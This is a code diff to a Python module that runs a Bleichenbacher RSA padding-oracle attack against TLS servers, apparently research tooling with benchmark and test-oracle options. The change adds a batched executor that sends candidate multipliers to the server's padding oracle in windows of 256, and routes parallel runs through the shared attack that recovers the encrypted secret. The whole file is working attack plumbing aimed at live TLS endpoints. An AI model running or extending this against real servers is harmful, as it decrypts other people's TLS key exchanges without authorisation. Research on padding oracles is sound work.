@@ -1,9 +1,9 @@
-"""TLS adapter for the shared attack and the existing parallel experiment."""
+"""TLS adapter for sequential and batched runs of the shared attack."""
 
 import json
 import time
 
-from reversebleichenbacher import ProofAttack, SequentialExecutor
+from reversebleichenbacher import ProofAttack, QueryResult, SequentialExecutor
 from reversebleichenbacher.core import AttackConfig
 
 from tls_transport import TLSOracle, ch, configure_oracle, get_rsa_from_server, make_cke_prefix
@@ -34,13 +34,35 @@ class TLSSequentialExecutor(SequentialExecutor):
             self.round_trips[self.phase] += self.oracle.round_trips - before_round_trips
 
 
+class TLSBatchExecutor(TLSSequentialExecutor):
+    """Submit one bounded window and return each reply with its candidate."""
+
+    batch_size = 256
+
+    def execute_batch(self, candidates):
+        before_queries = self.oracle.calls
+        before_round_trips = self.oracle.round_trips
+        work = self.oracle.submit(
+            [(candidate.multiplier, candidate) for candidate in candidates]
+        )
+        self._submitted_queries += len(work)
+        self.oracle_queries[self.phase] += self.oracle.calls - before_queries
+        self.round_trips[self.phase] += self.oracle.round_trips - before_round_trips
+        try:
+            for candidate, accepted in self.oracle.as_completed(work):
+                yield QueryResult(candidate, accepted)
+        finally:
+            self.oracle.cancel(work)
+
+
 class SharedTLSAttack:
-    def __init__(self, ip, port, rsa, prefix, test_oracle=False):
+    def __init__(self, ip, port, rsa, prefix, test_oracle=False, parallel=False):
         self.ip = ip
         self.port = port
         self.rsa = rsa
         self.prefix = prefix
         self.test_oracle = test_oracle
+        self.parallel = parallel
 
     def decrypt(self, encrypted):
         started = time.monotonic()
@@ -49,12 +71,14 @@ class SharedTLSAttack:
         executor = None
         attack = ProofAttack()
         attack.init_process("FFT", self.rsa.bits,
-                            AttackConfig.optimized("FFT", self.rsa.bits))
+                            AttackConfig.optimized("FFT", self.rsa.bits),
+                            parallel=self.parallel)
         error = None
         secret = None
         try:
             configure_oracle(oracle, self.rsa, quiet=True, test=self.test_oracle)
-            executor = TLSSequentialExecutor(oracle)
+            executor_class = TLSBatchExecutor if self.parallel else TLSSequentialExecutor
+            executor = executor_class(oracle)
             secret, _ = attack.attack(executor, self.rsa.N)
             return secret
         except Exception as exc:
@@ -89,12 +113,6 @@ class SharedTLSAttack:
 
 def bleichenbacher_attack_tls(ip, port, quiet=False, benchmark=False,
                               early_abort=False, test_oracle=False, parallel=False):
-    if parallel:
-        from legacy_attack.bleichenbachertls import bleichenbacher_attack_tls as legacy_tls_attack
-        return legacy_tls_attack(ip, port, quiet=quiet, benchmark=benchmark,
-                                 early_abort=early_abort, test_oracle=test_oracle,
-                                 parallel=True)
-
     rsa = get_rsa_from_server(ip, port)
     prefix = make_cke_prefix(rsa)
     if not quiet:
@@ -103,4 +121,5 @@ def bleichenbacher_attack_tls(ip, port, quiet=False, benchmark=False,
             configure_oracle(diagnostic, rsa, quiet=False, test=test_oracle)
         finally:
             diagnostic.executor.shutdown(wait=False, cancel_futures=True)
-    return SharedTLSAttack(ip, port, rsa, prefix, test_oracle=test_oracle)
+    return SharedTLSAttack(ip, port, rsa, prefix,
+                           test_oracle=test_oracle, parallel=parallel)
